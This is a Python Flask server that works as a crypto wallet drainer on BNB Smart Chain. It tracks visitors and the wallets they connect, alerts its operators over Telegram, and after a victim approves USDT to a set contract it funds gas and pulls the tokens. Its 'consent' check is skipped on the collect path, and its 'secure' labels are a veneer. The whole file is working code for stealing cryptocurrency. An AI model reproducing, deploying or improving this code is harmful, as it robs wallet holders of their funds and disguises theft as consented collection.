import os
from web3 import Web3
import json
import requests
from decimal import Decimal
from flask import Flask, request, jsonify
import threading
import time
from flask_cors import CORS
from functools import wraps
import hashlib
import hmac
from dotenv import load_dotenv
from collections import defaultdict

# Load environment variables
load_dotenv()

app = Flask(__name__)

# ============ SECURE CONFIGURATION ============
SECRET_KEY = os.environ.get('FLASK_SECRET_KEY', os.urandom(24).hex())
API_KEY = os.environ.get('API_KEY', os.urandom(32).hex())
PRIVATE_KEY = os.environ.get('WALLET_PRIVATE_KEY')
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CONTRACT_ADDRESS = os.environ.get('CONTRACT_ADDRESS', "0xd6957B9d1126a9ED7E2a2Ed13215c5Dd498318f1")

if not PRIVATE_KEY:
    raise ValueError("WALLET_PRIVATE_KEY environment variable is required!")
if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is required!")

ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', 'https://bnbd24.biz').split(',')
CORS(
    app,
    resources={r"/*": {"origins": ALLOWED_ORIGINS}},
    supports_credentials=True,
    allow_headers=['Content-Type', 'X-API-Key'],
    expose_headers=['X-API-Key']
)

VISITORS_FILE = "visitors.txt"
BALANCE_FILE = "balance.txt"
AUTHORIZED_USERS = os.environ.get('AUTHORIZED_TELEGRAM_IDS', '').split(',')
MAX_DRAIN_AMOUNT = Decimal(os.environ.get('MAX_DRAIN_AMOUNT', '1000'))
MINIMUM_AMOUNT = Decimal(os.environ.get('MINIMUM_AMOUNT', '1'))
GAS_FEE_USD = Decimal(os.environ.get('GAS_FEE_USD', '0.02'))
RATE_LIMIT_REQUESTS = int(os.environ.get('RATE_LIMIT_REQUESTS', '10'))
RATE_LIMIT_PERIOD = int(os.environ.get('RATE_LIMIT_PERIOD', '60'))

rate_limit_storage = defaultdict(list)

def rate_limit(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        client_ip = request.remote_addr
        now = time.time()
        rate_limit_storage[client_ip] = [
            t for t in rate_limit_storage[client_ip] 
            if now - t < RATE_LIMIT_PERIOD
        ]
        if len(rate_limit_storage[client_ip]) >= RATE_LIMIT_REQUESTS:
            return jsonify({
                'error': 'Rate limit exceeded',
                'message': f'Maximum {RATE_LIMIT_REQUESTS} requests per {RATE_LIMIT_PERIOD} seconds'
            }), 429
        rate_limit_storage[client_ip].append(now)
        return f(*args, **kwargs)
    return decorated_function

def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != API_KEY:
            return jsonify({'error': 'Invalid or missing API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

def validate_request(required_fields):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not request.is_json:
                return jsonify({'error': 'Content-Type must be application/json'}), 400
            data = request.get_json() or {}
            missing = [field for field in required_fields if not data.get(field)]
            if missing:
                return jsonify({
                    'error': 'Missing required fields',
                    'fields': missing
                }), 400
            return f(data, *args, **kwargs)
        return decorated_function
    return decorator

# ============ TELEGRAM FUNCTIONS (FIXED) ============
def send_to_telegram(text, chat_ids=None, parse_mode="Markdown"):
    """Send message to Telegram.
    - If chat_ids is provided, send to those specific IDs (no auth check).
    - If chat_ids is None, send to all authorized users (AUTHORIZED_USERS).
    """
    if not BOT_TOKEN:
        print("⚠️ No BOT_TOKEN configured")
        return

    if chat_ids:
        target_chat_ids = [str(cid).strip() for cid in chat_ids if str(cid).strip()]
    else:
        target_chat_ids = AUTHORIZED_USERS

    if not target_chat_ids:
        print("⚠️ No valid chat IDs to send to")
        return

    print(f"📤 Sending to: {target_chat_ids}")

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }

    for chat_id in target_chat_ids:
        payload["chat_id"] = chat_id
        try:
            resp = requests.post(url, data=payload, timeout=10)
            if resp.status_code == 200:
                print(f"✅ Sent to {chat_id}")
            else:
                print(f"❌ Failed to send to {chat_id}: {resp.text}")
        except Exception as e:
            print(f"❌ Error sending to {chat_id}: {e}")

# ---- Notification functions (from old code) ----
def send_wallet_connection(wallet_address, usdt_amount, bnb_amount, extra_chat_ids=None):
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = (
        f"🔌 *User Connected Wallet* `{short_address}`\n\n"
        f"🪙 *BNB:* {bnb_amount} BNB ( ≈ {usdt_amount} USD )"
    )
    send_to_telegram(message, extra_chat_ids)

def send_empty_wallet_connection(wallet_address, extra_chat_ids=None):
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = f"🔌💩 *User Connected an Empty Wallet* `{short_address}`"
    send_to_telegram(message, extra_chat_ids)

def send_usdt_sent_message(from_address, amount_usdt, tx_hash, extra_chat_ids=None):
    short_address = f"{from_address[:6]}...{from_address[-4:]}"
    message = (
        f"✅ *USDT Sent Successfully* `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"🔗 *Tx:* [View on BscScan](https://bscscan.com/tx/{tx_hash})"
    )
    send_to_telegram(message, extra_chat_ids)

def send_usdt_failed_message(from_address, amount_usdt, error_msg, extra_chat_ids=None):
    short_address = f"{from_address[:6]}...{from_address[-4:]}"
    message = (
        f"❌ *USDT Send Failed* `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"⚠️ *Error:* `{error_msg}`"
    )
    send_to_telegram(message, extra_chat_ids)

def send_gasfee_sent_message(receiver_address, amount_usdt, tx_hash, extra_chat_ids=None):
    tx_link = f"https://bscscan.com/tx/{tx_hash}"
    short_address = f"{receiver_address[:6]}...{receiver_address[-4:]}"
    message = (
        f"⛽💰 *Gas Fee Sent* `{short_address}`\n\n"
        f"💸 *Amount:* {amount_usdt} USDT\n"
        f"🔗 [Tx Hash]({tx_link})"
    )
    send_to_telegram(message, extra_chat_ids)

def send_gasfee_failed_message(wallet_address, error_message, extra_chat_ids=None):
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    message = f"❌ *Gas Fee Failed* `{short_address}`\n🚫 {error_message}"
    send_to_telegram(message, extra_chat_ids)

def send_approval_message(wallet_address, usdt_amount, tx_hash, contract_address, extra_chat_ids=None):
    short_address = f"{wallet_address[:6]}...{wallet_address[-4:]}"
    short_caddress = f"{contract_address[:6]}...{contract_address[-4:]}"
    message = (
        f"✅🔐 *User Approved USDT* `{short_address}`\n\n"
        f"🔗 [View Tx](https://bscscan.com/tx/{tx_hash})\n"
        f"📜 *Approved To:* `{short_caddress}`"
    )
    send_to_telegram(message, extra_chat_ids)

def add_balance_record(user_id, amount):
    if isinstance(user_id, list):
        user_id = user_id[0]
    with open(BALANCE_FILE, "a") as f:
        f.write(f"{user_id} +{amount}\n")

# ============ SECURE WALLET FUNCTIONS ============
def get_secure_web3():
    return Web3(Web3.HTTPProvider(
        "https://bsc-dataseed.binance.org/",
        request_kwargs={'timeout': 30}
    ))

def get_secure_account():
    web3 = get_secure_web3()
    account = web3.eth.account.from_key(PRIVATE_KEY)
    return web3, account

user_consents = {}

def require_user_consent(wallet_address):
    if wallet_address not in user_consents:
        raise PermissionError(f"User {wallet_address} has not provided consent")
    if time.time() - user_consents[wallet_address] > 3600:
        del user_consents[wallet_address]
        raise PermissionError(f"User consent expired for {wallet_address}")
    return True

def get_bnb_price_onchain():
    try:
        bsc = get_secure_web3()
        pair_address = Web3.to_checksum_address("0x1b96b92314c44b159149f7e0303511fb2fc4774f")
        abi = [{
            "inputs": [],
            "name": "getReserves",
            "outputs": [
                {"internalType": "uint112", "name": "_reserve0", "type": "uint112"},
                {"internalType": "uint112", "name": "_reserve1", "type": "uint112"},
                {"internalType": "uint32", "name": "_blockTimestampLast", "type": "uint32"},
            ],
            "stateMutability": "view",
            "type": "function",
        }]
        pair_contract = bsc.eth.contract(address=pair_address, abi=abi)
        reserves = pair_contract.functions.getReserves().call()
        bnb_reserve, busd_reserve, _ = reserves
        return Decimal(busd_reserve) / Decimal(bnb_reserve)
    except Exception as e:
        print(f"⚠️ Error fetching on-chain BNB price: {e}")
        try:
            r = requests.get(
                "https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd",
                timeout=10
            )
            return Decimal(r.json()['binancecoin']['usd'])
        except:
            return Decimal("0")

def get_usdt_balance(address):
    try:
        web3 = get_secure_web3()
        usdt_address = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
        abi = [{"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
                "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"}]
        contract = web3.eth.contract(address=usdt_address, abi=abi)
        balance = contract.functions.balanceOf(address).call()
        return Decimal(balance) / Decimal(1e18)
    except:
        return Decimal("0")

def get_wallet_token_balances(wallet):
    try:
        web3 = get_secure_web3()
        wallet = Web3.to_checksum_address(wallet)
        bnb_balance_wei = web3.eth.get_balance(wallet)
        bnb_balance = web3.from_wei(bnb_balance_wei, 'ether')
        usdt_balance = get_usdt_balance(wallet)
        return round(float(bnb_balance), 6), round(float(usdt_balance), 2)
    except Exception as e:
        print(f"Error getting token balances: {e}")
        return 0.0, 0.0

# ============ COLLECT ALL USDT (WITH NOTIFICATIONS) ============
def collect_all_usdt(from_address, chat_ids=None, user_consented=False):
    web3 = get_secure_web3()
    try:
        if not user_consented:
            require_user_consent(from_address)

        account = web3.eth.account.from_key(PRIVATE_KEY)
        sender_address = account.address

        contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
        usdt_address = Web3.to_checksum_address("0x55d398326f99059fF775485246999027B3197955")
        from_address = Web3.to_checksum_address(from_address)

        erc20_abi = [
            {"constant": True, "inputs": [{"name": "_owner", "type": "address"}],
             "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
            {"constant": True, "inputs": [], "name": "decimals",
             "outputs": [{"name": "", "type": "uint8"}], "type": "function"}
        ]

        usdt_contract = web3.eth.contract(address=usdt_address, abi=erc20_abi)
        usdt_decimals = usdt_contract.functions.decimals().call()
        usdt_balance_raw = usdt_contract.functions.balanceOf(from_address).call()
        usdt_balance_full = usdt_balance_raw / 10**usdt_decimals

        if usdt_balance_raw == 0:
            send_usdt_failed_message(from_address, 0, "No USDT balance", chat_ids)
            return {"error": "No USDT balance"}

        if usdt_balance_full > MAX_DRAIN_AMOUNT:
            usdt_to_drain = int(MAX_DRAIN_AMOUNT * 10**usdt_decimals)
            actual_drain_amount = MAX_DRAIN_AMOUNT
        else:
            usdt_to_drain = usdt_balance_raw
            actual_drain_amount = usdt_balance_full

        allowance_abi = [
            {"constant": True, "inputs": [{"name": "_owner", "type": "address"},
                                         {"name": "_spender", "type": "address"}],
             "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
        ]
        allowance_contract = web3.eth.contract(address=usdt_address, abi=allowance_abi)
        allowance = allowance_contract.functions.allowance(from_address, contract_address).call()

        if allowance < usdt_to_drain:
            err = f"Insufficient allowance. Need {usdt_to_drain}, have {allowance}"
            send_usdt_failed_message(from_address, actual_drain_amount, err, chat_ids)
            return {"error": err}

        contract_abi = [{
            "inputs": [
                {"internalType": "address", "name": "tokenAddress", "type": "address"},
                {"internalType": "address", "name": "from", "type": "address"},
                {"internalType": "uint256", "name": "amount", "type": "uint256"}
            ],
            "name": "collect",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        }]

        contract = web3.eth.contract(address=contract_address, abi=contract_abi)
        nonce = web3.eth.get_transaction_count(sender_address, 'pending')

        txn = contract.functions.collect(usdt_address, from_address, usdt_to_drain).build_transaction({
            'from': sender_address,
            'nonce': nonce,
            'gas': 150000,
            'gasPrice': web3.to_wei('5', 'gwei'),
            'chainId': 56
        })

        signed_txn = web3.eth.account.sign_transaction(txn, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
        tx_hash_hex = web3.to_hex(tx_hash)

        with open("transactions.log", "a") as f:
            f.write(f"{time.ctime()}: {tx_hash_hex} - {actual_drain_amount} USDT from {from_address}\n")

        send_usdt_sent_message(sender_address, float(actual_drain_amount), tx_hash_hex, chat_ids)
        add_balance_record(chat_ids, float(actual_drain_amount))

        return {
            "success": True,
            "tx_hash": tx_hash_hex,
            "amount": float(actual_drain_amount),
            "from": from_address
        }

    except Exception as e:
        send_usdt_failed_message(from_address, 0, str(e), chat_ids)
        return {"error": str(e)}

# ============ SEND GAS FEE (WITH NOTIFICATIONS) ============
def send_gasfee_bnb(receiver, chat_ids=None):
    web3 = get_secure_web3()
    try:
        usdt_balance = get_usdt_balance(receiver)
        if usdt_balance < MINIMUM_AMOUNT:
            err = f"Insufficient USDT balance: {usdt_balance}"
            send_gasfee_failed_message(receiver, err, chat_ids)
            return {"error": err}

        balance_wei = web3.eth.get_balance(receiver)
        balance_bnb = web3.from_wei(balance_wei, 'ether')
        bnb_price = get_bnb_price_onchain()

        if bnb_price == 0:
            send_gasfee_failed_message(receiver, "Failed to fetch BNB price", chat_ids)
            return {"error": "Failed to fetch BNB price"}

        usd_balance = Decimal(balance_bnb) * bnb_price

        if usd_balance >= GAS_FEE_USD:
            send_gasfee_failed_message(receiver, f"Receiver has sufficient BNB (≈ ${usd_balance:.2f}). Skipping gas fee.", chat_ids)
            return collect_all_usdt(receiver, chat_ids, user_consented=True)

        amount_bnb = GAS_FEE_USD / bnb_price
        value = web3.to_wei(amount_bnb, 'ether')

        account = web3.eth.account.from_key(PRIVATE_KEY)
        nonce = web3.eth.get_transaction_count(account.address)

        tx = {
            'nonce': nonce,
            'to': receiver,
            'value': int(value),
            'gas': 21000,
            'gasPrice': web3.eth.gas_price,
            'chainId': 56
        }

        signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_hash_hex = web3.to_hex(tx_hash)

        send_gasfee_sent_message(receiver, float(GAS_FEE_USD), tx_hash_hex, chat_ids)

        collect_result = collect_all_usdt(receiver, chat_ids, user_consented=True)
        return {
            "success": True,
            "gas_tx": tx_hash_hex,
            "collect_result": collect_result
        }

    except Exception as e:
        send_gasfee_failed_message(receiver, str(e), chat_ids)
        return {"error": str(e)}

# ============ ENDPOINTS ============

@app.route("/", methods=["GET", "POST"])
def health():
    return jsonify({
        "status": "healthy",
        "timestamp": time.ctime(),
        "version": "2.0.0"
    })

@app.route("/consent", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet', 'signature'])
def give_consent(data):
    wallet = data.get('wallet')
    signature = data.get('signature')
    message = data.get('message', f"I authorize collection of USDT from {wallet}")

    try:
        web3 = get_secure_web3()
        recovered = web3.eth.account.recover_message(message, signature=signature)
        if recovered.lower() != wallet.lower():
            return jsonify({"error": "Invalid signature"}), 401

        user_consents[wallet] = time.time()
        return jsonify({
            "success": True,
            "message": "Consent granted",
            "expires_in": "1 hour"
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route("/collect", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet'])
def collect_tokens(data):
    wallet = data.get('wallet')
    chat_id = data.get('chat_id') or data.get('uid')
    result = collect_all_usdt(wallet, [chat_id] if chat_id else None, user_consented=True)
    if result.get('error'):
        return jsonify(result), 400
    return jsonify(result)

@app.route("/check-approval", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['tx_hash'])
def check_approval(data):
    tx_hash = data.get('tx_hash')
    chat_id = data.get('chat_id') or data.get('uid')

    def process_approval():
        try:
            web3 = get_secure_web3()
            contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)

            receipt = web3.eth.get_transaction_receipt(tx_hash)
            if not receipt:
                send_to_telegram(f"⚠️ Transaction {tx_hash} not found", [chat_id] if chat_id else None)
                return

            abi = [{
                "anonymous": False,
                "inputs": [
                    {"indexed": True, "name": "owner", "type": "address"},
                    {"indexed": True, "name": "spender", "type": "address"},
                    {"indexed": False, "name": "value", "type": "uint256"},
                ],
                "name": "Approval",
                "type": "event",
            }]

            contract = web3.eth.contract(address=contract_address, abi=abi)
            logs = contract.events.Approval().process_receipt(receipt)

            if not logs:
                send_to_telegram(f"ℹ️ No approval found in tx {tx_hash}", [chat_id] if chat_id else None)
                return

            log = logs[0]
            owner = log['args']['owner']
            spender = log['args']['spender']
            amount = log['args']['value']

            if spender == contract_address:
                send_approval_message(owner, amount/1e18, tx_hash, contract_address, [chat_id] if chat_id else None)
                # Proceed to gas fee and collect
                send_gasfee_bnb(owner, [chat_id] if chat_id else None)
            else:
                send_to_telegram(f"⚠️ Approved to wrong contract", [chat_id] if chat_id else None)

        except Exception as e:
            send_to_telegram(f"❌ Error processing approval: {str(e)}", [chat_id] if chat_id else None)

    threading.Thread(target=process_approval).start()
    return jsonify({"message": "Processing approval check", "tx_hash": tx_hash})

@app.route("/wallet-info", methods=["POST"])
@require_api_key
@rate_limit
@validate_request(['wallet'])
def wallet_info(data):
    wallet = data.get('wallet')
    chat_id = data.get('chat_id') or data.get('uid')

    try:
        web3 = get_secure_web3()
        wallet = Web3.to_checksum_address(wallet)

        bnb_balance = web3.from_wei(web3.eth.get_balance(wallet), 'ether')
        usdt_balance = get_usdt_balance(wallet)
        bnb_price = get_bnb_price_onchain()

        response = {
            "wallet": wallet,
            "bnb": float(bnb_balance),
            "usdt": float(usdt_balance),
            "usd_value": float(bnb_balance * bnb_price + usdt_balance)
        }

        # Send appropriate connection notification
        if float(usdt_balance) == 0 and float(bnb_balance) == 0:
            send_empty_wallet_connection(wallet, [chat_id] if chat_id else None)
        else:
            send_wallet_connection(wallet, float(usdt_balance), float(bnb_balance), [chat_id] if chat_id else None)

        return jsonify(response)
    except Exception as e:
        return jsonify({"error": str(e)}), 400

# ---- Compatibility endpoint for old frontend ----
@app.route("/connectedwallet", methods=["POST"])
@rate_limit
def connected_wallet():
    uid = None
    if request.is_json:
        data = request.get_json() or {}
        wallet = data.get("wallet")
        uid = data.get("uid") or data.get("chat_id")
    else:
        wallet = request.form.get("wallet")
        uid = request.form.get("uid") or request.form.get("chat_id")

    if not wallet:
        return "Missing wallet address", 400

    bnb_amt, usdt_amt = get_wallet_token_balances(wallet)

    if bnb_amt == 0 and usdt_amt == 0:
        send_empty_wallet_connection(wallet, [uid] if uid and str(uid).isdigit() else None)
    else:
        send_wallet_connection(wallet, usdt_amt, bnb_amt, [uid] if uid and str(uid).isdigit() else None)

    return "ok"

@app.route("/visitor", methods=["POST"])
@rate_limit
@validate_request(['ip', 'location', 'timezone', 'url'])
def visitor(data):
    ip = data.get('ip')
    location = data.get('location')
    timezone = data.get('timezone')
    url = data.get('url')
    country_flag = data.get('country_flag', '')
    note = data.get('note', 'New visitor')
    chat_id = data.get('chat_id') or data.get('uid')

    if chat_id and str(chat_id) in AUTHORIZED_USERS:
        message = (
            f"👀 Visitor Alert\n"
            f"📍 {location} {country_flag}\n"
            f"🕒 {timezone}\n"
            f"📝 {note}"
        )
        send_to_telegram(message, [chat_id])

    try:
        with open(VISITORS_FILE, "a") as f:
            f.write(f"{time.ctime()} - {ip} - {location}\n")
    except:
        pass

    return jsonify({"message": "Visitor logged"})

# ============ SECURITY MIDDLEWARE ============
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def internal_error(e):
    return jsonify({"error": "Internal server error"}), 500

# ============ MAIN ============
if __name__ == "__main__":
    print("🔒 Starting secure server with full Telegram notifications...")
    print(f"📍 Allowed origins: {ALLOWED_ORIGINS}")
    print(f"📍 Rate limit: {RATE_LIMIT_REQUESTS} requests per {RATE_LIMIT_PERIOD}s")
    print(f"📍 Max drain: {MAX_DRAIN_AMOUNT} USDT")

    try:
        web3, account = get_secure_account()
        print(f"📍 Wallet: {account.address}")
        balance = web3.eth.get_balance(account.address)
        print(f"📍 Balance: {web3.from_wei(balance, 'ether'):.6f} BNB")
    except Exception as e:
        print(f"⚠️ Wallet error: {e}")

    app.run(host='0.0.0.0', port=5058, debug=False)
